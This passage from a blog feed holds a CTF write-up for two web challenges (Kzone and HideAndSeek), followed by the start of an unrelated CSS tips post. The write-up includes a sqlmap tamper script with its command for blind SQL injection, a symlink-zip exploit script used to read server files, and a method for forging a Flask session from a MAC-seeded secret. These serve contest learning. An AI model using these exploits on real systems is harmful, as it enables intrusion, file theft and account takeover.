    <content type="html"><![CDATA[<p>近来有时间补了一下之前比赛遗留下来的wp<br><a id="more"></a></p><h2 id="Kzone"><a href="#Kzone" class="headerlink" title="Kzone"></a>Kzone</h2><p>仿的一个qq空间的钓鱼站，<a href="http://www.zip下载源码后，尝试各个功能点审计，动态调试后，发现正常登录的功能点不会设置一个名为`login_data`参数的cookie，而这个点可以用来登录，" target="_blank" rel="noopener">www.zip下载源码后，尝试各个功能点审计，动态调试后，发现正常登录的功能点不会设置一个名为`login_data`参数的cookie，而这个点可以用来登录，</a> 也算是出题人后来加上的功能点，然后将其当成考点？</p><p>登录的时候是不会自动带上这个参数的：<br><img src="http://static.zybuluo.com/Passer6y/wolvkvlhm12cd4tmmgs8wl51/image_1d2pmhrhn131a15m1s633c31ok69.png" alt="image_1d2pmhrhn131a15m1s633c31ok69.png-331kB"><br>我们手动设置后，然后将其导入到浏览器cookie中，可以用这个cookie登录。</p><p>其过程为：<br>在后台登录前，会包含一个共有的文件：<br><img src="http://static.zybuluo.com/Passer6y/pvhr9rlcy3oabo1asww1asnq/image_1d2pmo0qfnr8s2vn8h1ghn1ndam.png" alt="image_1d2pmo0qfnr8s2vn8h1ghn1ndam.png-35.3kB"></p><p>这里重点关注member.php：<br><img src="http://static.zybuluo.com/Passer6y/wmbck0yks0xuh38uoolksvl0/image_1d2pmp8e0lbi1s0c1iom1jvb5q713.png" alt="image_1d2pmp8e0lbi1s0c1iom1jvb5q713.png-177.7kB"></p><p>使用cookie登录的数据会进行一次json_decode解码：<br><img src="http://static.zybuluo.com/Passer6y/1g24nx907bes3heygv1kgce4/image_1d2pmq8bs1uai3g8v08vqb17661g.png" alt="image_1d2pmq8bs1uai3g8v08vqb17661g.png-279.8kB"></p><p>这里学习了有的师傅使用了json_decode()会unicode自动解码的特性绕过。</p><p>嫖了一个tamper脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    data = &apos;&apos;&apos;&#123;&quot;admin_user&quot;:&quot;%s&quot;&#125;;&apos;&apos;&apos;</span><br><span class="line">    payload = payload.lower()</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(&apos;u&apos;, &apos;\u0075&apos;)</span><br><span class="line">    payload = payload.replace(&apos;o&apos;, &apos;\u006f&apos;)</span><br><span class="line">    payload = payload.replace(&apos;i&apos;, &apos;\u0069&apos;)</span><br><span class="line">    payload = payload.replace(&apos;\&apos;&apos;, &apos;\u0027&apos;)</span><br><span class="line">    payload = payload.replace(&apos;\&quot;&apos;, &apos;\u0022&apos;)</span><br><span class="line">    payload = payload.replace(&apos; &apos;, &apos;\u0020&apos;)</span><br><span class="line">    payload = payload.replace(&apos;s&apos;, &apos;\u0073&apos;)</span><br><span class="line">    payload = payload.replace(&apos;#&apos;, &apos;\u0023&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&gt;&apos;, &apos;\u003e&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&lt;&apos;, &apos;\u003c&apos;)</span><br><span class="line">    payload = payload.replace(&apos;-&apos;, &apos;\u002d&apos;)</span><br><span class="line">    payload = payload.replace(&apos;=&apos;, &apos;\u003d&apos;)</span><br><span class="line">    payload = payload.replace(&apos;f1a9&apos;, &apos;F1a9&apos;)</span><br><span class="line">    payload = payload.replace(&apos;f1&apos;, &apos;F1&apos;)</span><br><span class="line">    return data % payload</span><br></pre></td></tr></table></figure></p><p><code>python sqlmap.py -r jsondecode --tamper &quot;jsondecodeBypassTamper.py&quot; -v 3 --dbs --dbms=mysql --level 2</code><br><img src="http://static.zybuluo.com/Passer6y/htskjw1ru8rlbgygwjblwt04/image_1d2q0ca8db591201295cagmai1t.png" alt="image_1d2q0ca8db591201295cagmai1t.png-272.6kB"></p><p>然鹅预期解是读install.sql，会发现数据表引擎使用的是<code>innodb</code>。<br>MySQL 5.7 之后的版本，在其自带的 mysql 库中，新增了 innodb_table_stats 和 innodb_index_stats 这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息。</p><p>因为过滤了or，所以布尔盲注的时候利用setcookie次数造成的差异进行注入。</p><p>造成布尔盲注的流程：<br><img src="http://static.zybuluo.com/Passer6y/dpu0i90uerdjmjb5fuqeglfx/image_1d2q2gce28uf9qd1unfvff1etr9.png" alt="image_1d2q2gce28uf9qd1unfvff1etr9.png-265.5kB"><br>如果查询用户名不为空，且密码和数据库中哈希进行弱类型比较绕过成功，则登录成功。<br>如果查询用户名为空，当然此时密码肯定也不会和空相等，所以会有四次set-cookie</p><p>当然也可以在密码一直比较错误的情形下利用：<br>用户名字段查询不到东西(为空)：set-cookie四次<br>用户名字段查询到东西：set-cookoe两次</p><h2 id="HideAndSeek"><a href="#HideAndSeek" class="headerlink" title="HideAndSeek"></a>HideAndSeek</h2><p>注册后题目是一个上传zip文件的地方，会自动解压并渲染出文件内容。<br>奇怪的是提交完之后直接就在这样一个<br><code>http://206.189.144.143:20000/upload</code>路径下渲染了，也没有具体的文件名等信息。<br><img src="http://static.zybuluo.com/Passer6y/zwsywi592apqetatwhdkpwid/image_1d2sinmfjerubu1mqb3ubp2n9.png" alt="image_1d2sinmfjerubu1mqb3ubp2n9.png-135.9kB"></p><p>如果再去访问upload会进行跳转，所以猜测是渲染一次之后就删了。<br>尝试构造文件名<code>../../../../../../etc/passwd</code>的压缩文件(瞎试的)，返回一片空白..<br>其次压缩文件里有目录结构，也会返回空白。</p><p>网上找到一篇文件上传软连接的文章：<a href="https://xz.aliyun.com/t/2589" target="_blank" rel="noopener">https://xz.aliyun.com/t/2589</a></p><p>构造软连接压缩文件<br><img src="http://static.zybuluo.com/Passer6y/x5hfrpxwel5kry6wjccq89bu/image_1d2tn76jklvg18c58u5q8ldabm.png" alt="image_1d2tn76jklvg18c58u5q8ldabm.png-53kB"></p><p>zip -y 表示存储链接文件，不会替代源文件<br><img src="http://static.zybuluo.com/Passer6y/3dfj01cqoeqf49nmy00uetew/image_1d2tn8g1f13b411lssterek13qp1j.png" alt="image_1d2tn8g1f13b411lssterek13qp1j.png-11.2kB"></p><p>上传压缩文件后得到：<br><img src="http://static.zybuluo.com/Passer6y/amiy8nrn32hi0olh92x4pxe0/image_1d2tn9v15pofqka17t56l3bvm20.png" alt="image_1d2tn9v15pofqka17t56l3bvm20.png-87.2kB"></p><p>现在有了一个任意文件读取，接下来得猜测目录,尝试读取proc伪文件<br>`/proc/self/cwd  读不到东西，猜想原因如下：<br><img src="http://static.zybuluo.com/Passer6y/ymzwljn92zize9vd6skmvsds/image_1d2tqatlg1jjpkre9ginlg1mgo9.png" alt="image_1d2tqatlg1jjpkre9ginlg1mgo9.png-40.7kB"></p><p>再试试读环境变量：<code>/proc/self/environ</code>,这里读到了很多相关文件信息<br><img src="http://static.zybuluo.com/Passer6y/gi0q1n5gqdhj6ddlrruvgmgs/image_1d2tqlpt2935hbp1ug01hc91ogi9.png" alt="image_1d2tqlpt2935hbp1ug01hc91ogi9.png-48kB"></p><p>再读一下：<code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code><br><img src="http://static.zybuluo.com/Passer6y/x8p4udzjqszajlvh420l70ia/image_1d2tr01251e8bmvq5r8p43i8m.png" alt="image_1d2tr01251e8bmvq5r8p43i8m.png-33.6kB"></p><blockquote><p>知识面太窄了，没接触过flask，后来才知道这是源码路径：<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code></p></blockquote><p>反正源码就大概在/app目录下，之后就是脑洞和经验了.. wp说由cookie可以猜到是flask，然后提示用的docker，默认在/app/main.py，所以去读/app/main.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def hello():</span><br><span class="line">    version = &quot;&#123;&#125;.&#123;&#125;&quot;.format(sys.version_info.major, sys.version_info.minor)</span><br><span class="line">    message = &quot;Hello World from Flask in a uWSGI Nginx Docker container with Python &#123;&#125; (default)&quot;.format(</span><br><span class="line">        version</span><br><span class="line">    )</span><br><span class="line">    return message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, debug=True, port=80)</span><br></pre></td></tr></table></figure></p><p>读出源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from flask import Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import random</span><br><span class="line">import flag</span><br><span class="line">from werkzeug.utils import secure_filename</span><br><span class="line">import os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100)</span><br><span class="line">app.config[&apos;UPLOAD_FOLDER&apos;] = &apos;./uploads&apos;</span><br><span class="line">app.config[&apos;MAX_CONTENT_LENGTH&apos;] = 100 * 1024</span><br><span class="line">ALLOWED_EXTENSIONS = set([&apos;zip&apos;])</span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return &apos;.&apos; in filename and \</span><br><span class="line">           filename.rsplit(&apos;.&apos;, 1)[1].lower() in ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;, methods=[&apos;GET&apos;])</span><br><span class="line">def index():</span><br><span class="line">    error = request.args.get(&apos;error&apos;, &apos;&apos;)</span><br><span class="line">    if(error == &apos;1&apos;):</span><br><span class="line">        session.pop(&apos;username&apos;, None)</span><br><span class="line">        return render_template(&apos;index.html&apos;, forbidden=1)</span><br><span class="line"></span><br><span class="line">    if &apos;username&apos; in session:</span><br><span class="line">        return render_template(&apos;index.html&apos;, user=session[&apos;username&apos;], flag=flag.flag)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/login&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def login():</span><br><span class="line">    username=request.form[&apos;username&apos;]</span><br><span class="line">    password=request.form[&apos;password&apos;]</span><br><span class="line">    if request.method == &apos;POST&apos; and username != &apos;&apos; and password != &apos;&apos;:</span><br><span class="line">        if(username == &apos;admin&apos;):</span><br><span class="line">            return redirect(url_for(&apos;index&apos;,error=1))</span><br><span class="line">        session[&apos;username&apos;] = username</span><br><span class="line">    return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/logout&apos;, methods=[&apos;GET&apos;])</span><br><span class="line">def logout():</span><br><span class="line">    session.pop(&apos;username&apos;, None)</span><br><span class="line">    return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/upload&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if &apos;the_file&apos; not in request.files:</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    file = request.files[&apos;the_file&apos;]</span><br><span class="line">    if file.filename == &apos;&apos;:</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    if file and allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename)</span><br><span class="line">        if(os.path.exists(file_save_path)):</span><br><span class="line">            return &apos;This file already exists&apos;</span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    else:</span><br><span class="line">        return &apos;This file is not a zipfile&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        extract_path = file_save_path + &apos;_&apos;</span><br><span class="line">        os.system(&apos;unzip -n &apos; + file_save_path + &apos; -d &apos;+ extract_path)</span><br><span class="line">        read_obj = os.popen(&apos;cat &apos; + extract_path + &apos;/*&apos;)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(&apos;rm -rf &apos; + extract_path)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        file = None</span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    if(file != None):</span><br><span class="line">        if(file.find(base64.b64decode(&apos;aGN0Zg==&apos;).decode(&apos;utf-8&apos;)) != -1):</span><br><span class="line">            return redirect(url_for(&apos;index&apos;, error=1))</span><br><span class="line">    return Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    #app.run(debug=True)</span><br><span class="line">    app.run(host=&apos;127.0.0.1&apos;, debug=True, port=10008)</span><br></pre></td></tr></table></figure></p><p>看到他import了flag，直接去读flag，然鹅..直接被拦了<br><img src="http://static.zybuluo.com/Passer6y/f1ocjg7yf4dva04z7tuqsvq1/image_1d2trt9n9125b1u8bcajrf1jl613.png" alt="image_1d2trt9n9125b1u8bcajrf1jl613.png-61.6kB"></p><p>所以现在思路就是越权成为admin，这里使用的一个固定的随机数种子，uuid.getnode()获得10进制mac地址，可以在/sys/class/net/eth0/address读到mac地址，所以可以伪造session越权称为admin，</p><p>读到mac地址：<code>02:42:ac:11:00:02</code>，在线转成10进制：<br><a href="https://www.vultr.com/tools/mac-converter/?mac_address=02%3A42%3Aac%3A11%3A00%3A02" target="_blank" rel="noopener">https://www.vultr.com/tools/mac-converter/?mac_address=02%3A42%3Aac%3A11%3A00%3A02</a><br>得到种子：2485377892354</p><p>然后本地搭一下flask环境拿到session即可得到flag。</p><p>最后看了其他师傅们的wp，还可以读.bash_history等等，这里嫖了一个exp(我全程手动操作的..)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import random </span><br><span class="line">import os</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import zipfile</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def generate_zip(path,i):</span><br><span class="line">    zip_name =  &apos;moxiaoxi&apos;+str(i)+&apos;.zip&apos;</span><br><span class="line">    link_namme = &apos;moxiaoxi&apos;+str(i)</span><br><span class="line">    os.system(&quot;ln -s &#123;&#125; &#123;&#125;&quot;.format(path,link_namme))</span><br><span class="line">    print &quot;ln -s &#123;&#125; &#123;&#125;&quot;.format(path,link_namme)</span><br><span class="line">    os.system(&quot;zip -y &#123;&#125; &#123;&#125;&quot;.format(zip_name,link_namme))</span><br><span class="line">    with open(zip_name,&apos;r&apos;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    return zip_name,data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp(path,i):</span><br><span class="line">    zip_name,data = generate_zip(path,i)</span><br><span class="line">    # zip_name,data = rewrite(path,i)</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    paramsPost = &#123;&quot;submit&quot;:&quot;Submit&quot;&#125;</span><br><span class="line">    paramsMultipart = [(&apos;the_file&apos;, (zip_name, data, &apos;application/zip&apos;))]</span><br><span class="line">    headers = &#123;&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Linux; Android 9.0; SAMSUNG-SM-T377A Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36&quot;,&quot;Referer&quot;:&quot;http://hideandseek.2018.hctf.io/&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;DNT&quot;:&quot;1&quot;&#125;</span><br><span class="line">    cookies = &#123;&quot;session&quot;:&quot;eyJ1c2VybmFtZSI6Im1veGlhb3hpIn0.Dsf5zA.yM84QphtcfEoykAu2lwjxp7_QvI&quot;&#125;</span><br><span class="line">    response = session.post(&quot;http://hideandseek.2018.hctf.io/upload&quot;, data=paramsPost, files=paramsMultipart, headers=headers, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    print(&quot;Status code: %i&quot; % response.status_code)</span><br><span class="line">    print(&quot;Response body: %s&quot; % response.content)</span><br><span class="line">    if len(response.content)&gt;5:</span><br><span class="line">        # print(&quot;Response body: %s&quot; % response.content)</span><br><span class="line">        with open(&apos;out.txt&apos;,&apos;a+&apos;) as f:</span><br><span class="line">            f.write(&apos;\n\n&#123;&#125;\n\n&#123;&#125;&apos;.format(path,response.content)) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    name =  &apos;test&apos;+&apos;&apos;.join(random.sample(string.ascii_letters + string.digits, 4))</span><br><span class="line">    exp(sys.argv[1],name)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;近来有时间补了一下之前比赛遗留下来的wp&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://passer6y.fun/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://passer6y.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CSS Tricks</title>
    <link href="http://passer6y.fun/2019/01/29/CSS%20Tricks/"/>
    <id>http://passer6y.fun/2019/01/29/CSS Tricks/</id>
    <published>2019-01-29T12:30:00.000Z</published>
    <updated>2019-01-29T12:32:15.460Z</updated>
    
    <content type="html"><![CDATA[<p>接上一篇文章，学习css中踩的坑，一些小的知识点汇总，wiki的前端设计也总算是可以告一段落了，效果图：<br><a id="more"></a><br><img src="https://i.loli.net/2019/01/29/5c4fc69d0dc92.png" alt=""></p><h2 id="水平-垂直居中总结："><a href="#水平-垂直居中总结：" class="headerlink" title="水平/垂直居中总结："></a>水平/垂直居中总结：</h2><p>行内元素: 用<code>text-align:center</code>居中，用<code>line-height</code>垂直居中；</p><p>块状元素: 用<code>margin: 0 auto</code>水平居中，垂直居中用：<code>display:table-cell; vertical-align:middle</code>。<br>如果已设块状元素高度，可以将margin-top和margin-bottom设为：(父元素高度-子元素高度)/2；</p><p>水平垂直同时居中还有一种办法，将父元素position设为relative，该元素设为absolute，然后<code>margin:auto</code>即可。</p><p>other:<br>实际开发中遇到的一个问题，使用了绝对定位交叉轴位置(设置了top),如果此时想实现在水平自动定位的话，得给他加一个子标签，然后用<code>margin: 0 auto</code>,父标签记得设置宽度<code>width: 100%</code></p><p>还有一种办法即,子盒子设百分比宽高，边距用相对的position调整<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.feature-3&#123;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 1000px;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">.feature-3 .feature-box&#123;</span><br><span class="line">    width: 72%;</span><br><span class="line">    height: 90%;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">    position: relative;</span><br><span class="line">    top: 25px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>参考： <a href="http://www.cnblogs.com/chaixiaozhi/p/8490725.html" target="_blank" rel="noopener">http://www.cnblogs.com/chaixiaozhi/p/8490725.html</a></p></blockquote><h2 id="input标签透明"><a href="#input标签透明" class="headerlink" title="input标签透明"></a>input标签透明</h2><p><code>background-color: transparent;</code></p><h2 id="背景图高度自适应问题"><a href="#背景图高度自适应问题" class="headerlink" title="背景图高度自适应问题"></a>背景图高度自适应问题</h2><p>我们想让一个背景图纵向填充整个屏幕, 要先将其父元素全部使用高度100%自适应，这样子元素才会生效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">html,body&#123;</span><br><span class="line">    height: 100%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.menu&#123;</span><br><span class="line">    height: 100%;</span><br><span class="line">    width: 100px;</span><br><span class="line">    background: url(&apos;image/Base.png&apos;);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="字体图片在列表中对不齐时"><a href="#字体图片在列表中对不齐时" class="headerlink" title="字体图片在列表中对不齐时"></a>字体图片在列表中对不齐时</h2><p><img src="http://static.zybuluo.com/Passer6y/3w8wpzp1i5oc0fdf6gppbm54/image_1d25eive5171i1kc91s233mt4og9.png" alt="image_1d25eive5171i1kc91s233mt4og9.png-14.9kB"></p><p>给每个图指定宽度，垂直居中即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">img&#123;</span><br><span class="line">    width: 18px;</span><br><span class="line">    vertical-align:middle;//指定行内元素（inline）或表格单元格（table-cell）元素的垂直对齐方式。</span><br><span class="line">    margin-right: 5px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;dl&gt;</span><br><span class="line">    &lt;dt&gt;YOUR PEODUCTS &lt;img src=&quot;image/Settings.png&quot; alt=&quot;&quot;&gt;&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Book of Wisdom.png&quot; alt=&quot;&quot;&gt; Book&lt;/a&gt;&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Video Camera.png&quot; alt=&quot;&quot;&gt; Tutorials&lt;/a&gt;&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Chart.png&quot; alt=&quot;&quot;&gt; Stocks&lt;/a&gt;&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Painting.png&quot; alt=&quot;&quot;&gt;  Infographics&lt;/a&gt;&lt;/dd&gt;</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure></p><h2 id="将非可点击的元素设置悬停由鼠标指针变成手"><a href="#将非可点击的元素设置悬停由鼠标指针变成手" class="headerlink" title="将非可点击的元素设置悬停由鼠标指针变成手"></a>将非可点击的元素设置悬停由鼠标指针变成手</h2><p><code>cursor: pointer;</code><br><img src="http://static.zybuluo.com/Passer6y/q6t8l98fu8cjr756k4km9r2r/image_1d29dv0dn3dh12j9cn21jpfd4v9.png" alt="image_1d29dv0dn3dh12j9cn21jpfd4v9.png-1.2kB"></p><h2 id="搜索框写法"><a href="#搜索框写法" class="headerlink" title="搜索框写法"></a>搜索框写法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.search&#123;</span><br><span class="line">        height: 70px;</span><br><span class="line">        width: 100%;</span><br><span class="line">        border-bottom: 1px solid #ccc;</span><br><span class="line">        border-right: 1px solid #ccc;</span><br><span class="line">        position: absolute;</span><br><span class="line">        top:0;</span><br><span class="line">&#125;</span><br><span class="line">.search .search-box&#123;</span><br><span class="line">    display: block;</span><br><span class="line">    width: 340px;</span><br><span class="line">    height: 35px;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">    margin-top: 17.5px;     /*居中的另外一种写法，(父元素高-子元素高)/2*/</span><br><span class="line">    margin-bottom: 17.5px;</span><br><span class="line">    border: 1px solid rgba(0, 0, 0, 0.1);</span><br><span class="line">    border-radius: 8px;</span><br><span class="line">    text-indent: 1em;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">.search .search-box .m-search&#123;</span><br><span class="line">    height: 100%;</span><br><span class="line">    width: 85%;</span><br><span class="line">    outline: none;   /*关闭聚焦时的外框*/</span><br><span class="line">&#125;</span><br><span class="line">.search .search-box 